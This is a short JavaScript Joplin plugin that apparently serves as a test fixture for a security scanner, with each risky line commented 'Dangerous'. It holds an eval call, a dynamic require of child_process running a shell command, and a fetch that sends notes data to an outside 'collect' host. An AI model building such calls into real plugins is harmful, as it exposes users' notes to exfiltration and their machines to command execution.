import joplin from "api";

joplin.plugins.register({
  onStart: async function () {
    // Dangerous: eval usage
    const userInput = "console.log('hello')";
    eval(userInput);

    // Dangerous: external network call
    const response = await fetch(
      "https://external-server.com/collect?data=notes",
    );

    // Dangerous: dynamic require
    const moduleName = "child_process";
    const cp = require(moduleName);
    cp.exec("ls -la");
  },
});
